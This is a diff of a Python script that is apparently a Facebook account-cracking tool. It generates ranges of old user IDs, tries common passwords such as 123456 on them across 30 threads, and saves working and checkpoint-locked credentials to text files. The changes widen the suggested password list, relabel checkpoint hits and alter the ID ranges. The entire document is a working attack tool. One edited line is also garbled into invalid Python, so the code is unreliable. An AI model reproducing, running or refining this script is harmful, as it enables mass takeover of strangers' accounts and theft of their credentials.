@@ -1,4 +1,4 @@
-W = '\033[97;1m'
+- - W = '\033[97;1m'
 R = '\033[91;1m'
 G = '\033[92;1m'
 Y = '\033[93;1m'
@@ -451,7 +451,7 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] USE (123456,987654,33233,556677,223322........) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
@@ -855,7 +855,7 @@ class Main:
 				open("2009-MAHABUB-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MAHABUB-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ MAHABUB-CP ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-MAHABUB-CP.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -865,9 +865,9 @@ class Main:
 		self.loop +=1
 
 	def old2(self):
-		x = 11111111111
-		xx = 99999999999
-		idx = "1000" 
+		x = 11111111
+		xx = 99999999
+		idx = "1000000" 
 		os.system('clear');print(logo)
 		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -1282,7 +1282,7 @@ class Main:
 				open("2009-MAHABUB-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MAHABUB-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ MAHABUB-CP ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-MAHABUB-CP.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
